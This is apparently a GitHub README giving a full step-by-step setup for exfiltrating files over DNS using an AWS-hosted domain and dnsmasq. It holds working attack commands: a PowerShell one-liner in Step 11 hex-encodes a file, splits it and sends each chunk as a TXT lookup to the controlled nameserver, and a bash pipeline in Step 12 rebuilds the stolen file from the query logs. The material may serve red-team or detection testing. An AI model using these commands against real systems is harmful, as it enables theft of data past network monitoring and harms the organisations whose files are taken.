# DNS Exfil
DNS Exfiltration Setup on AWS

## Step 1: Purchase Domain Name on Route 53
Verify your email!

## Step 2: Create EC2 instance to host DNS service and logging
Use Amazon Linux OS, or any Linux OS of your preference.
Logging will contain DNS requests with encoded information, which we can then grep and cut later.

## Step 3: Create Security Groups
Inbound - Allow ICMP, TCP DNS, UDP DNS, SSH  
Outbound - Any  

## Step 4: Install dnsmasq on EC2 instance and configure it
sudo yum install dnsmasq  
sudo nano /etc/dnsmasq.conf then input the content below, right at the bottom of the config file  
  
listen-address=<EC2's private IP>  
address=/#/<EC2's public IP>  
log-queries  
log-facility=/var/log/dnsmasq.log  
  
Restart the VM, or find a way to restart dnsmasq (sudo systemctl restart systemd-networkd.service)  

sudo dnsmasq  

## Step 5: Go to Route 53 config, note down default SOA and NS records
**Record Name:** bhealthen.com  
**Type:** SOA  
**Value:** ns-1714.awsdns-22.co.uk. awsdns-hostmaster.amazon.com. 1 7200 900 1209600 86400  
**TTL:** 900  

**Record Name:** bhealthen.com  
**Type:** NS  
**Value:**  
ns-1714.awsdns-22.co.uk.  
ns-1071.awsdns-05.org.  
ns-577.awsdns-08.net.  
ns-113.awsdns-14.com.  
**TTL:** 172800  

![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/f096c51f-a06d-4df4-b8a9-e1ad61579d8f)

## Step 6: Create A Record to point from record name to your EC2 instance
**Record Name:** ns1.bhealthen.com  
**Type:** A  
**Value:** 54.179.112.60
**TTL:** 300  

**Record Name:** ns2.bhealthen.com  
**Type:** A  
**Value:** 54.179.112.60
**TTL:** 300  

## Step 7: Modify existing NS Record to point to your NS records, which point to your EC2 instance
**Record Name:** bhealthen.com  
**Type:** NS  
**Value:**  
ns1.bhealthen.com  
ns2.bhealthen.com  
**TTL:** 60  

## Step 8: Modify existing SOA record to point to your NS record, which points to your EC2 instance
**Record Name:** bhealthen.com  
**Type:** SOA  
**Value:** ns1.bhealthen.com. admin.bhealthen.com 1 7200 900 1209600 86400  
**TTL:** 60  

## Step 9: Use CMD to nslookup as a test
nslookup -q=TXT 12332145343dafdsa234234123123453asdf234sadfsadfasdf ns1.bhealthen.com  

![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/79dc6562-8f73-41bd-89ac-9db7701c0946)


## Step 10: Check your DNS logs in EC2
sudo cat /var/log/dnsmasq.log | grep -F "[TXT]"  

![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/ff2684c5-136f-4ab2-8da7-88c17f0aa1a2)


## Step 11: Powershell command to hex encode a file, split, and do nslookup

`certutil -encodehex ToExfil.txt encoded.hex 12; $buffer = Get-Content .\encoded.hex; $split = $buffer -split '(.{50})' -ne ''; foreach ($line in $split) {nslookup -q=TXT "$Line.bhealthen.com" ns1.bhealthen.com; sleep 5} `

![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/17905ffc-ee42-4f8d-b801-7f837d3da555)


## Step 12: Use a BASH command to read contents from TXT requests, remove unnecessary content, remove line break, remove spacing

`sudo cat /var/log/dnsmasq.log | grep -F '[TXT]' | cut -f 7 -d ' ' | cut -f 1 -d '.' | sed -z 's/\n/ /g' | sed -e 's/[[:space:]]//g' > output`  
`sudo cat output | xxd -p -r > ToExfil.txt | cat ToExfil.txt`  

![image](https://github.com/benlee105/DNS_Exfil/assets/62729308/68856338-b515-43e4-a873-d86df3ca9b27)

